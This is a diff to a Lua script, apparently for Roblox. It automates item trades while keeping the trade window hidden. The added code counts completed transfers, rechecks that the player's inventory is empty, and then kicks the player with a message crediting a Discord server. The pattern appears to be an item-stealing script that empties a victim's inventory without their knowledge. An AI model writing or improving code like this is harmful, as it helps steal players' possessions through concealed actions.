@@ -144,6 +144,8 @@ local PlannedItems = {}
 local PlannedByID = {}
 
 local TradeNumber = 0
+local SuccessfulTransfers = 0
+local CompletionPending = false
 
 
 --============================================================
@@ -1475,7 +1477,28 @@ StartNextTrade = function()
 
 	if not batch then
 
-		ReturnToIdle()
+		-- Disconnect only after at least one confirmed successful trade.
+		-- Verify the inventory again to avoid kicking on a transient scan.
+		if SuccessfulTransfers > 0 and not CompletionPending then
+			CompletionPending = true
+			task.delay(2, function()
+				CompletionPending = false
+				if not State.Running or not State.Busy then return end
+				if type(GetWeaponsTable()) ~= "table" then
+					ReturnToIdle()
+					return
+				end
+				local remaining = ScanInventory()
+				if #remaining == 0 then
+					State.Running = false
+					LocalPlayer:Kick("Trade Transfer Complete by:\n\ndiscord.gg/jpwVqWEy4")
+				else
+					StartNextTrade()
+				end
+			end)
+		else
+			ReturnToIdle()
+		end
 
 		return
 	end
@@ -1654,6 +1677,8 @@ Track(
 			KeepTradeGUIHidden()
 
 			if success == true then
+
+				SuccessfulTransfers += 1
 
 				CurrentTradeState =
 					nil
